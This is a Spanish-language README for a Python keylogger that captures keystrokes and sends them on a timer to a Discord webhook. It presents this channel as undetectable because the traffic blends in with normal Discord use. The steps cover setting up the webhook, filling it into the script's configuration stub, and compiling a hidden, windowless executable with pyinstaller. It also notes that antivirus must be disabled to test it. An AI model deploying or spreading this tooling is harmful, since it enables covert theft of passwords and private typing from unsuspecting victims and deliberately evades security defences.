
# Keylogger que reporta a Discord #

Este script de python capturara todas las teclas apretadas durante una ventana de tiempo predefinida y las reportara a un servidor de Discord por medio de Webhooks. a diferencia de los metodos tradicionales como "Guardar en un txt" o "Enviar a un email", este metodo permanece indetectado ya que los request de webhook son considerados trafico normal de Discord.


## Deployment

Tener Python instalado en su maquina, descargar el lenguaje desde [aqui](https://www.python.org/downloads/).


## Instalar librerias requeridas
```
python -m pip install -r requirements.txt
```

## Crear un servidor de Discord

Puedes usar [este](https://support.discord.com/hc/en-us/articles/204849977-How-do-I-create-a-server-) articulo para ver como hacerlo.

## Crear un Discord Webhook

Ingresa a la configuracion del servidor y selecciona Intergrations >>  Webhooks y crear un nuevo Webhook, se lo puede customizar y darle un nombre y un icono. Es necesario copiar al URL del webhook.

![screenshot](https://i.imgur.com/i084ESb.png)

## Editar keylogger.py

Ahora que poseemos el webhook podemos editar el script en python. Debemos añadir la url al archivo y asegurarnos de colocar el timeframe en el cual deseamos que el kelogger haga los reportes. 

```Python
import keyboard,os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = "TIEMPO_EN_SEGUNDOS_ACA"
WEBHOOK = "URL_DEL_WEBHOOK_ACA"
```

## Ejecutar el script

Una vez hecho eso, podremos ejecutar el script correctamente.
Para ejecutar el script solo debemos colocar esto en la terminal:
```
python keylogger.py
```
si todo sale bien deberiamos ver el reporte en discord despues de esperar el tiempo establecido.
![c2](https://imgur.com/MxKQE7n.png)

## Compilar el script

Para convertir el archivo en un ejecutable necesitaremos la libreria  pyinstaller que fue incluida en el archivo requirements.txt.
```
pyinstaller keylogger.py --onefile --noconsole
```

(Es necesario desactivar el windows defender/antivirus para probrar el programa)

